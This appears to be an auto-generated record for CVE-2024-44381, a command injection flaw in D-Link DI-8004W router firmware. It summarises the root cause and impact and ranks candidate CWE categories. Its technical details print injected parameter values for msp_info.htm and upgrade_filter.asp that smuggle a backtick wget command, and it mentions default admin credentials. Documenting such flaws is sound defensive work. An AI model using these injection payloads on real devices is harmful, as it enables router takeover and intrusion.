# Vulnerability Information: CVE-2024-44381

## Vulnerability Description
D-Link DI_8004W 16.07.26A1 contains a command execution vulnerability in jhttpd msp_info_htm function.

### Vulnerability Description Key Phrases
- **impact:** command execution
- **product:** D-Link DI_8004W
- **version:** 16.07.26A1
- **component:** jhttpd msp_info_htm function

## CVE Reference Links Content Summary
Based on the provided content, here's an analysis of the vulnerabilities:

**Root Cause:**

*   The root cause lies in the improper handling of user-supplied input in two specific functions within the D-Link DI-8004W router's firmware: `msp_info_htm` and `upgrade_filter_asp`. The firmware fails to sanitize or validate the parameters passed to these functions, leading to command injection.

**Weaknesses/Vulnerabilities:**

*   **Command Injection:** The primary vulnerability is command injection. By crafting specific requests to `msp_info_htm` and `upgrade_filter_asp` pages, an attacker can inject arbitrary shell commands, which are then executed by the router's operating system.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** Successful exploitation of these vulnerabilities allows an attacker to achieve remote code execution on the affected D-Link DI-8004W router.
*   **Complete System Compromise:**  An attacker can gain full control over the device, potentially allowing them to:
    *   Steal sensitive information
    *   Modify router settings
    *   Use the router as a bot in a botnet
    *   Launch further attacks on connected devices or the internal network.

**Attack Vectors:**

*   **HTTP GET Request:** Both vulnerabilities are exploitable through specially crafted HTTP GET requests to the web interface of the router.
*   **Vulnerable Pages:**
    *   `msp_info.htm`: The `flag` and `cmd` parameters are used to inject commands.
    *   `upgrade_filter.asp`: The `path` parameter is used to inject commands.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to have network connectivity to the vulnerable router. This could be from within the local network or remotely if the router's management interface is exposed to the internet.
*   **Authentication:**  The exploits are described as requiring the attacker to be logged in to the web interface with administrator credentials. The default admin/admin credentials can be used if the user hasn't changed them.

**Technical Details:**

*   **Vulnerable Firmware:** DI_8004W-16.07.26A1.trx
*   **Exploit 1 (msp_info_htm):**
    *   The `flag` parameter is set to `cmd`.
    *   The `cmd` parameter is used to inject the command, for example: `cmd=\`wget http://192.168.0.2:8000/test.txt\``
*   **Exploit 2 (upgrade_filter_asp):**
    *   The `path` parameter is used to inject a command, for example: `path=http://\`wget http://192.168.0.2:8000/test2.txt\``
*   **Authentication Bypass:** Not explicitly mentioned in this context, but the exploit descriptions imply that a valid session cookie is necessary to perform the attack

**Summary**

The provided content describes two command injection vulnerabilities in the D-Link DI-8004W router's firmware, both exploitable via HTTP GET requests. By using crafted requests to the `msp_info.htm` and `upgrade_filter.asp` pages, an attacker can inject and execute arbitrary shell commands on the router. The attacker must have network access to the router and valid admin credentials for the exploit to succeed. This results in full remote code execution, leading to a complete compromise of the device.

This analysis is more detailed than what is provided in a typical CVE description.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | Class | Allowed-with-Review | sparse | 0.028 |
| 2 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | sparse | 0.027 |
| 3 | 121 | Stack-based Buffer Overflow | Variant | Allowed | sparse | 0.025 |
| 4 | 120 | Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') | Base | Allowed-with-Review | sparse | 0.024 |
| 5 | 259 | Use of Hard-coded Password | Variant | Allowed | sparse | 0.023 |
| 6 | 36 | Absolute Path Traversal | Base | Allowed | sparse | 0.022 |
| 7 | 74 | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') | Class | Discouraged | sparse | 0.021 |
| 8 | 401 | Missing Release of Memory after Effective Lifetime | Variant | Allowed | sparse | 0.021 |
| 9 | 790 | Improper Filtering of Special Elements | Class | Allowed-with-Review | dense | 0.551 |
| 10 | 123 | Write-what-where Condition | Base | Allowed | graph | 0.002 |

